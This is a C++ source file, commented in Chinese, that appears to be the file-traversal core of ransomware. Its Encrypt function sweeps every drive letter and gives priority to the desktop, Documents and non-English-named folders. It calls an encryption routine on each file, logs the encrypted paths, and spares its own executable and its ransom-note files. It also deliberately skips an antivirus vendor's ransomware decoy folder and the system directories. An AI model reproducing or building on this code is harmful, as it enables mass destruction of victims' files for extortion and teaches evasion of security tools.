#pragma once
#include <shlobj.h>
#include "tool.h"
#include "fileEncrypt.h"
#include "var.h"

using std::endl;
using std::exception;

//遍历文件与加密文件
void specialPathInit()
{
	//桌面路径
	specialPaths[specialPathNum] = DesktopPath;
	specialPathNum++;
	//文档文件夹路径
	specialPaths[specialPathNum] = getSpecialPath(CSIDL_PERSONAL);
	specialPathNum++;
}

//对path目录下名为name文件的处理
void fileProcess(string path, string name)
{
	string nPath = path + "\\" + name;
	//文件过滤
	if (nPath == EXEPATH || nPath == FilePaths || nPath == DesktopPath + "\\msg.txt" || nPath == DesktopPath + "\\pic.jpg") //防止加密本身及桌面通知文件
		return;
	try
	{
		fileEncryptFunc(nPath);
		FileNameWriter << nPath << endl;
	}
	catch (exception& e)
	{
		;
	}
}

//仅针对特殊目录
void DirWalk(string path)
{
	if (_access(path.c_str(), 0) != 0) //路径不存在
	{
		//printf("%s not exist!", path.c_str()); //调试！！！！！！！！！！！！！！！
		return;
	}
	long fd;
	int temp;
	struct _finddata_t fileinfo;
	string newpath;
	newpath = path + "\\*";
	fd = _findfirst(newpath.c_str(), &fileinfo); //查找第一个
	if (fd != -1)
	{
		if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
		{
			//第一个filename一般是'.' 该语句一般不会被触发
			temp = fileOrDir(fileinfo);
			if (temp == 1) //文件夹 处理
			{
				string nextpath;
				nextpath = path + "\\" + fileinfo.name;
				DirWalk(nextpath);
			}
			else if (temp == 0) //文件处理
			{
				fileProcess(path, fileinfo.name);
			}
		}
		while (!_findnext(fd, &fileinfo))
		{
			if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
			{
				if (fileinfo.attrib == 22) //隐藏文件夹不遍历
				{
					HideDir.insert(HideDir.begin(), path + "\\" + fileinfo.name);
					continue;
				}
				temp = fileOrDir(fileinfo);
				if (temp == 1) //文件夹 处理
				{
					string nextpath = path + "\\" + fileinfo.name;
					DirWalk(nextpath);
				}
				else if (temp == 0) //文件处理
				{
					fileProcess(path, fileinfo.name);
				}
			}
		}
		_findclose(fd); //关闭
	}
}

//需要绕过的文件夹
string NDWPATH[100] = {
	":\\ program",   //火绒火绒的勒索病毒诱捕文件夹
	":\\Zresources", //大概是某软件的诱捕文件夹
	":\\Windows",
	":\\Program Files (x86)",
	":\\Program Files",
	":\\ProgramData",
	":\\PerfLogs" };
int NDWPATHNUM = 6;
//遍历path下的文件并将文件全部加密
void DirWalk2(string path, int fflag = 0)
{
	//printf("scan: %s\t\n", path.c_str()); //调试!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	if (_access(path.c_str(), 0) != 0) //路径不存在
	{
		return;
	}
	//特殊目录过滤,如诱捕文件夹, windows文件夹等
	for (int i = 0; i < NDWPATHNUM; i++)
		if (path.find(NDWPATH[i]) == 1)
		{
			//printf("special dir pass %s\n", path.c_str()); //调试!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
			return;
		}
	//绕过已经遍历过的特殊文件夹
	for (int i = 0; i < specialPathNum; i++)
		if (path == specialPaths[i])
		{
			//printf("pass %s\n", path.c_str()); //调试!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
			return;
		}
	//
	long fd;
	int temp;
	struct _finddata_t fileinfo;
	string newpath;
	newpath = path + "\\*";
	fd = _findfirst(newpath.c_str(), &fileinfo); //查找第一个
	if (fd != -1)
	{
		if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
		{
			//第一个filename一般是'.' 该语句一般不会被触发
			temp = fileOrDir(fileinfo);
			if (temp == 1) //文件夹 处理
			{
				string nextpath;
				nextpath = path + "\\" + fileinfo.name;
				DirWalk2(nextpath, fflag);
			}
			else if (temp == 0) //文件处理
			{
				fileProcess(path, fileinfo.name);
			}
		}
		while (!_findnext(fd, &fileinfo))
		{
			if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
			{
				if (fileinfo.attrib == 22 && fflag == 0) //隐藏文件夹暂时不遍历
				{
					HideDir.insert(HideDir.begin(), path + "\\" + fileinfo.name);
					continue;
				}
				temp = fileOrDir(fileinfo);
				if (temp == 1) //文件夹处理
				{
					string nextpath = path + "\\" + fileinfo.name;
					//printf("fileinfo: %d  ", fileinfo.attrib); //调试！！！！！！！！！！！！
					DirWalk2(nextpath, fflag);
				}
				else if (temp == 0) //文件处理
				{
					fileProcess(path, fileinfo.name);
				}
			}
		}
		_findclose(fd); //关闭
	}
}

void Encrypt() //加密
{
	char pf[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z' };
	string a = "C:";
	for (int i = 0; i < 26; i++)
	{
		//扫描当前盘符下的文件, 优先遍历可能存有重要文件的目录
		a[0] = pf[i];
		if (_access(a.c_str(), 0) != 0) //路径不存在
		{
			continue;
		}
		long fd;
		struct _finddata_t fileinfo;
		string newpath;
		vector<string> PathList1; //非英文目录
		vector<string> PathList2; //其它目录
		newpath = a + "\\*";
		fd = _findfirst(newpath.c_str(), &fileinfo); //查找第一个
		if (fd != -1)
		{
			while (!_findnext(fd, &fileinfo))
			{
				if (strcmp(fileinfo.name, "..") != 0 && strcmp(fileinfo.name, ".") != 0)
				{
					//printf("rootD:  %s\n", fileinfo.name); //调试！！！！！！！！！！！！！！！！！！！！！！！！
					if (fileinfo.attrib == 22) //隐藏文件夹暂时不遍历
					{
						HideDir.insert(HideDir.begin(), a + "\\" + fileinfo.name);
						continue;
					}
					int temp = fileOrDir(fileinfo);
					if (temp == 1) //文件夹处理
					{
						int k;
						string nextpath = a + "\\" + fileinfo.name;
						for (k = 0; k < sizeof(nextpath); k++) //判断是否是非英文目录
						{
							if (nextpath[k] == 0)
							{
								k = 0x0fffffff;
								break;
							}
							if (nextpath[k] > 255 || nextpath[k] < 0)
							{
								// printf("Cchar: %c---%d---%s---%d \n", nextpath[k], k, nextpath.c_str(), sizeof(nextpath)); //调试！！！！！！！！！！！！！！！！！
								// for (int mm = 0; mm < sizeof(nextpath); mm++)
								//     printf("%.2x-", nextpath[mm]);
								// printf("\n");
								PathList1.push_back(nextpath);
								break;
							}
						}
						if (k >= sizeof(nextpath))
							PathList2.push_back(nextpath);
					}
					else if (temp == 0) //文件处理
					{
						fileProcess(a, fileinfo.name);
					}
				}
			}
			_findclose(fd); //关闭
		}
		for (int j = 0; j < PathList1.size(); j++)
		{
			//printf("List1: %s\n", PathList1[j].c_str());
			DirWalk2(PathList1[j]);
		}
		//遍历设定的特殊目录
		specialPathInit(); //初始化特殊目录
		//遍历特殊目录
		for (int i = 0; i < specialPathNum; i++)
		{
			DirWalk(specialPaths[i]);
		}
		//遍历普通目录
		for (int j = 0; j < PathList2.size(); j++)
		{
			//printf("List2: %s\n", PathList2[j].c_str());
			DirWalk2(PathList2[j]);
		}
	}
}